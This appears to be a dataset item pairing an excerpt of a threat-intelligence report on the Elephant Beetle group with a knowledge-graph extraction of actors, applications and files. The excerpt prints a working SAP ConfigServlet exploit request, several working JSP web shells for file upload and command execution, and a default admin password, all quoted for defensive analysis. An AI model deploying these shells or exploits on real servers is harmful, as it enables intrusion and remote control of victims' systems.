@@ -1,0 +1,235 @@
+
+
+
+Sentence : Elephant Beetle’s target of choice
+This group uses standard procedure cyberattack techniques, especially by focusing on existing software with well
+known—but likely unpatched—vulnerabilities.
+The group’s preferred targets are Java-based web servers, typically WebSphere and WebLogic. They exploit web
+servers using known vulnerabilities to infiltrate organizations. The compromised servers are then used by the threat
+actors for persistent access vectors to the network, and as pivot points for credential harvesting activities and
+lateral movement to additional assets in the network.
+In the incidents Sygnia responded to, the group was observed leveraging default credentials for authenticating
+myWebMethods (“WMS”) and QLogic web management interface. For example, the group leveraged the
+default password “manage” of the privileged system user ‘sysadmin’ of WMS servers. In addition, the threat group
+exploited four vulnerabilities (three of them are recorded and published as CVEs) to gain access to the network:
+1. Primefaces Application Expression Language Injection (CVE-2017-1000486)
+Primetek Primefaces 5.x is vulnerable to a weak encryption flaw resulting in remote code execution. [2]
+2. WebSphere Application Server SOAP Deserialization Exploit (CVE-2015-7450)
+Serialized-object interfaces in certain IBM analytics, business applications, cognitive, IT infrastructure, and
+mobile and social products allow remote attackers to execute arbitrary commands via a crafted serialized
+Java object, related to the InvokerTransformer class in the Apache Commons Collections library. [3]
+3. SAP NetWeaver Invoker Servlet Exploit (CVE-2010-5326)
+The Invoker Servlet on SAP NetWeaver Application Server Java platforms, possibly before 7.3, does not require
+authentication, which allows remote attackers to execute arbitrary code via an HTTP or HTTPS request, as
+exploited in the wild in 2013 through 2016, aka a Detour attack. [4]
+4. SAP NetWeaver ConfigServlet Remote Code Execution (EDB-ID-24963)
+A remote command execution vulnerability has been reported in SAP NetWeaver. The vulnerability is due to
+insufficient validation in SAP ConfigServlet handling of incoming GET requests. By sending a specially-crafted
+GET request, an attacker could exploit this vulnerability to inject and execute arbitrary commands on the
+system. [5]
+The basic payload for these exploits was either a simple obfuscated web shell enabling remote code execution,
+or a series of exploitations, running different commands on the target machine. Following the initial web shell, a
+set of both open-source web shells, such as “JspSpy,” [6], “reGeorge,” [7], “MiniWebCmdShell,” [8], “Vonloesch Jsp File
+Browser 1.2” [9] and custom web shells were uploaded separately or as a bundle and were used by the group.
+Below is an example of a web request that was sent by the threat group to one of the victim’s SAP portals, which
+exploits the SAP ConfigServlet Remote Code Execution and contains a one-line command that creates a web
+shell.
+2 https://nvd.nist.gov/vuln/detail/CVE-2017-1000486
+3 https://nvd.nist.gov/vuln/detail/CVE-2015-7450
+4 https://nvd.nist.gov/vuln/detail/CVE-2010-5326
+5 https://www.checkpoint.com/defense/advisories/public/2015/cpai-2015-0672.html/
+6 https://github.com/tennc/webshell/blob/master/jsp/JspSpy.jsp
+7 https://github.com/sensepost/reGeorg
+8 https://github.com/xl7dev/WebShell/blob/master/Php/ava%20Server%20Faces%20MiniWebCmdShell%200.2%20by%20HeartLESS.php
+9 https://www.vonloesch.de/filebrowser.html
+4
+```
+/ctc/servlet/com.sap.ctc.util.configservlet?param=com.sap.ctc.util.filesystemconfig;execute_cmd;cmdline=s
+h%20-c%20$@|sh%20.%20echo%20perl%20-mmime::base64%20-0777%20le%20%27print%20decode_base64(%22PCUobmV3IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbShyZXF1ZXN0LmdldFBhcmFtZXRlcigi
+ZiIpKSkud3JpdGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIoInQiKS5nZXRCeXRlcygpKTslPiAK%22)%27%20%3e%20./root/com.sap.js
+p
+```
+Figure 1: The URL that was requested by the threat group.
+```
+sh -c $@|sh . echo perl -mmime::base64 -0777 -le 'print
+decode_base64(PCUobmV3IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbShyZXF1ZXN0LmdldFBhcmFtZXRlcigiZiIpKSkud3JpdGUocmV
+xdWVzdC5nZXRQYXJhbWV0ZXIoInQiKS5nZXRCeXRlcygpKTslPiAK)' > ./root/com.sap.jsp
+```
+Figure 2: The URL-decoded version of the remote command to execute by the exploit.
+```
+<%(new java.io.FileOutputStream(request.getParameter(f))).write(request.getParameter(t).getBytes());%>
+```
+Figure 3: The Base64 decoded content that was written to the ./root/com.sap.jsp, which is a basic file uploader Web shell.
+5
+Hiding in plain sight
+A great deal of this attack is focused on going undetected for extended periods of time. This is done through
+multiple means, including laying low and engaging in minimal to no activity, so the attackers remain blended
+into the background. Their primary goal at this stage is almost solely surveillance and research.
+With the goal of blending into the environment, Elephant Beetle will often try and mimic its surroundings and likes
+to choose the most innocuous surroundings it can. For example, the first deployed web shells were mainly
+dropped into the resources folders of each web application, disguising themselves as fonts, images, CSS, and JS
+resources, with similar names to original files in these folders - but with a ‘.JSP’ extension.
+1. <web_application_root_folder>/
+2. ├── css/
+3. │  ├── bootstrap.min.css
+4. │  └── bootstrap.min.css.jsp
+5. ├── js/
+6. │  ├── bootstrap.min.js
+7. │  └── bootstrap.min.jsp
+8. ├── img/
+9. │  ├── favicon.ico
+10. │  ├── favicon.ico.jsp
+11. └── fonts/
+12. ├── glyphicons -halflings-regular.svg
+13. ├── glyphicons -halflings-regular.woff
+14. └── glyphicons-halflings-regular.woff.jsp
+Figure 4: Example of web shells naming and location convention inside a website resource folders.
+Masquerading as a legitimate package
+When the attackers are ready to engage and execute their attack, they level up their aggressiveness. For
+example, they will often leverage compromised administrative accounts of the target web servers for deploying
+malicious WAR (Web Application Resource/Web Application Archive) files containing a variety of web shells,
+each with different capabilities.
+WAR files are used for distributing a collection of web page files and resources, wrapped in a single archive file.
+By using WAR files, the group distributes/deploys multiple tools using a single file. The WAR file that is deployed by
+the group is often named with a variation of the word example to masquerade as a legitimate package, e.g.,
+‘wsexample.war’, ‘wsexamples.war’, ‘examples.war’ and ‘exampl3s.war’.
+The following figure shows the original file structure of a malicious WAR named ‘wsexample.war’, which was found
+by Sygnia during an incident response investigation. Several selected web shells are presented in the next figures.
+1. wsexample/
+2. ├── META-INF/
+3. │ └── …
+4. ├── WEB-INF/
+5. │ └── …
+6. ├── .login-n.jsp // Linux Command Execution Web shell
+7. ├── .login-w.jsp // Windows Command Execution Web shell
+8. ├── ex-ample.jsp // File Uploader Web shell
+9. ├── _example.jsp // reGeorge Web shell
+10. ├── up-base.jsp // Base64 encoded File Uploader Web shell
+11. ├── id_win.jsp // jsp File browser 1.2 (Windows configured)
+12. └── one-lin.jsp // Obfuscated Linux Command Execution Web shell
+Figure 5: Example of the malicious ‘wsexample.war’ WAR file structure, containing web shells with their original names and purpose.
+6
+This technique is considered to be super-persistent on some web servers, specifically WebSphere and
+WebMethods, due to the fact that removal of the web shell files is insufficient, as the web pages are being loaded
+and held in the server’s process memory. A compiled version of the web shell is also being kept in the form of
+.class files that are being loaded during the server startup. More information about the nature of the .class files
+will be provided further down in the report in the Hunting and defending against Elephant Beetle (a.k.a. “Elefante”)
+chapter.
+One of the methods the threat group has used for obtaining administrative credentials is browsing through local
+files on the compromised machines for clear-text credentials inside scripts and configuration files.
+In several occurrences where a ‘WebSphere Application Server (WAS)’ was compromised, the threat actor has
+searched recursively through it using the string, ‘wasadmin’, which is the default administrator user for the
+WebSphere web interface. Several configuration files reside on the server itself (e.g., ‘server.xml’) and contain an
+encoded version of credentials by default. The default encoding format of passwords saved by WebSphere is
+{xor}, which can be easily decoded by a variety of open-source scripts.
+After obtaining the admin credentials for the WebSphere application, the threat group leveraged them for
+logging into the WebSphere admin interface and deploying the WAR application.
+Additionally, the threat group deployed malicious WAR files via an Apache Tomcat Manager web interface of
+QLogic servers by accessing /manager/html/upload, a known exploit with a corresponding Metasploit module.
+Another technique for WAR deployment that was used by the group was leveraging Tomcat auto-deploy
+mechanism by placing the malicious WAR under $CATALINA_BASE\webapps folder on the compromised server.
+The following code snippets are just a small part of the web shells that were identified inside the malicious WAR
+files (which were also deployed by using other methods mentioned in this chapter):
+Snippet of the ‘up-base.jsp’ web shell code, where the HTTP request parameter ‘f’ expected to be the target
+filename and ‘t’ should contain the content of the file to be upload, Base64 encoded:
+```
+<%if(request.getParameter(f)!=null)(new
+java.io.FileOutputStream(request.getParameter(f))).write(javax.xml.bind.DatatypeConverter.parseBase64Bina
+ry(request.getParameter(t)));%>
+```
+Figure 6: The file content of ‘up-base’.jsp as was found inside ‘wsexmaple.war.’
+Snippet of the ‘.login-w.jsp’ Web shell code, where the HTTP request parameter ‘zc’ expected to be the
+command line to execute by ‘cmd.exe /c’ on the target machine:
+```
+<%@ page import=java.util.Map,java.util.Map.Entry,java.util.,java.io. %><% try {String[] command =
+{ cmd.exe, /c, request.getParameter(zc) }; ProcessBuilder probuilder = new ProcessBuilder( command
+);Process process = probuilder.start(); InputStream is = process.getInputStream(); InputStreamReader isr
+= new InputStreamReader(is); BufferedReader br = new BufferedReader(isr); String line; while ((line =
+br.readLine()) != null) {out.println(line);};} catch (Exception e) {}; %>
+```
+Figure 7: The file content of ‘.login-w’.jsp as was found inside ‘wsexmaple.war.’
+Snippet of the ‘one-line.jsp’ Web shell obfuscated code, where the HTTP request parameter ‘zc’ expected to be
+the command line to execute by ‘/bin/bash -c’ on the target machine.
+```
+<%@ page import=java.util.Map,java.util.Map.Entry,java.util.,java.io. %><% try {String[] NL =
+{ TbinTsh.replaceAll(T,/), -c, request.getHeader(zc)}; ProcessBuilder KV = new ProcessBuilder( NL
+);Process GRQZ = KV.start(); InputStream Z = GRQZ.getInputStream(); InputStreamReader ZW = new
+InputStreamReader(Z); BufferedReader ZSORHPBJTWY = new BufferedReader(ZW); String VIUTZN; while ((VIUTZN
+= ZSORHPBJTWY.readLine()) != null) {out.println(VIUTZN);};} catch (Exception e) {}; %>
+```
+Figure 8: The file content of ‘one-lin.jsp’ as was found inside ‘wsexmaple.war’.
+7
+Nothing suspicious to see here
+Another technique that was used by the threat actor was modifying or replacing completely the default web
+page files. – i.e., replacing the iisstart.aspx or default.aspx on IIS web servers. Using this technique allowed the
+threat group two things – the first is an almost guaranteed access to their web shell from other servers or from the
+internet, because the routes for this are often allowed by default. The second is that access to such pages is not
+classified as suspicious. And in the default.aspx case specifically, the page that is being accessed is the root page
+(/), which is mostly accessed by regular users and is considered normal behavior.
+Snippet of the ‘iisstart.aspx’ web shell code, written in VB and slightly obfuscated.
+```
+<%@ Page AspCompat=true Language=VB %>
+
+Untitled
+Page
+```
+Figure 9: The file content of ‘iisstart’.aspx.
+8
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "Elephant Beetle", "type" : "ACTO"},
+        {"id": 2, "description": "Java-based web servers", "type" : "APPS"},
+        {"id": 3, "description": "WebSphere", "type" : "APPS"},
+        {"id": 4, "description": "WebLogic", "type" : "APPS"},
+        {"id": 5, "description": "WMS (myWebMethods)", "type" : "APPS"},
+        {"id": 6, "description": "QLogic servers", "type" : "APPS"},
+        {"id": 7, "description": "Apache Tomcat Manager web interface", "type" : "APPS"},
+        {"id": 8, "description": "WebSphere Application Server (WAS)", "type" : "APPS"},
+        {"id": 9, "description": "IIS web servers", "type" : "APPS"},
+        {"id": 10, "description": "server.xml", "type" : "EXE"},
+        {"id": 11, "description": "wsexample.war", "type" : "EXE"},
+        {"id": 12, "description": "examples.war", "type" : "EXE"},
+        {"id": 13, "description": "exampl3s.war", "type" : "EXE"},
+        {"id": 14, "description": "bootstrap.min.css.jsp", "type" : "EXE"},
+        {"id": 15, "description": "bootstrap.min.js.jsp", "type" : "EXE"},
+        {"id": 16, "description": "favicon.ico.jsp", "type" : "EXE"},
+        {"id": 17, "description": "glyphicons-halflings-regular.woff.jsp", "type" : "EXE"},
+        {"id": 18, "description": ".login-n.jsp (Linux Command Execution Web shell)", "type" : "EXE"},
+        {"id": 19, "description": ".login-w.jsp (Windows Command Execution Web shell)", "type" : "EXE"},
+        {"id": 20, "description": "ex-ample.jsp (File Uploader Web shell)", "type" : "EXE"},
+        {"id": 21, "description": "_example.jsp (reGeorge Web shell)", "type" : "EXE"},
+        {"id": 22, "description": "up-base.jsp (Base64 encoded File Uploader Web shell)", "type" : "EXE"},
+        {"id": 23, "description": "id_win.jsp (jsp File browser 1.2)", "type" : "EXE"},
+        {"id": 24, "description": "one-lin.jsp (Obfuscated Linux Command Execution Web shell)", "type" : "EXE"},
+        {"id": 25, "description": "iisstart.aspx", "type" : "EXE"},
+        {"id": 26, "description": "default.aspx", "type" : "EXE"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "description": "Targets and compromises Java-based web servers"},
+        {"source": 1, "target": 3, "description": "Specifically targets WebSphere for deployment of malicious WAR files"},
+        {"source": 1, "target": 4, "description": "Specifically targets WebLogic for deployment of malicious WAR files"},
+        {"source": 1, "target": 5, "description": "Compromises WMS (myWebMethods) for administrative credentials"},
+        {"source": 1, "target": 6, "description": "Compromises QLogic servers via Apache Tomcat Manager web interface"},
+        {"source": 1, "target": 7, "description": "Deploys malicious WAR files via Apache Tomcat Manager web interface"},
+        {"source": 1, "target": 8, "description": "Searches for and exploits WebSphere Application Server (WAS)"},
+        {"source": 1, "target": 9, "description": "Modifies default pages on IIS web servers to hide web shells"},
+        {"source": 1, "target": 10, "description": "Exploits configuration files like server.xml for credentials"},
+        {"source": 1, "target": 11, "description": "Deploys malicious WAR file named wsexample.war"},
+        {"source": 1, "target": 12, "description": "Deploys malicious WAR file named examples.war"},
+        {"source": 1, "target": 13, "description": "Deploys malicious WAR file named exampl3s.war"},
+        {"source": 1, "target": 14, "description": "Drops web shell into resources folder with similar names to original files"},
+        {"source": 1, "target": 15, "description": "Drops web shell into resources folder with similar names to original files"},
+        {"source": 1, "target": 16, "description": "Drops web shell into resources folder with similar names to original files"},
+        {"source": 1, "target": 17, "description": "Drops web shell into resources folder with similar names to original files"},
+        {"source": 1, "target": 18, "description": "Deploys Linux Command Execution Web shell inside WAR file"},
+        {"source": 1, "target": 19, "description": "Deploys Windows Command Execution Web shell inside WAR file"},
+        {"source": 1, "target": 20, "description": "Deploys File Uploader Web shell inside WAR file"},
+        {"source": 1, "target": 21, "description": "Deploys reGeorge Web shell inside WAR file"},
+        {"source": 1, "target": 22, "description": "Deploys Base64 encoded File Uploader Web shell inside WAR file"},
+        {"source": 1, "target": 23, "description": "Deploys jsp File browser 1.2 (Windows configured) inside WAR file"},
+        {"source": 1, "target": 24, "description": "Deploys Obfuscated Linux Command Execution Web shell inside WAR file"},
+        {"source": 1, "target": 25, "description": "Modifies iisstart.aspx to hide web shells"},
+        {"source": 1, "target": 26, "description": "Modifies default.aspx to hide web shells"}
+    ]
+}
